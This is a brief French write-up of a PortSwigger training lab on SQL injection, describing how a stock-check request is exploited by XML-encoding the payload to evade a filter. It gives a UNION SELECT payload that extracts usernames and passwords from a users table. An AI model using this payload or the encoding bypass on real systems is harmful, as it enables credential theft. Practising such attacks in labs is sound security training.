# __[SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)__

URL : [https://0a6400a60370b6a680f3ead0004400ca.web-security-academy.net/](https://0a6400a60370b6a680f3ead0004400ca.web-security-academy.net/)

Quand on regarde le stock d’un objet on a : 

![[Filter_bypass_via_XML_encoding_01_b9ab3a4ff2.png]]

On encode cette commande : 1 UNION SELECT username || '~' || password FROM users—

Et donc on converti en xml :

![[Filter_bypass_via_XML_encoding_02_33c621b884.png]]

Et hop flag
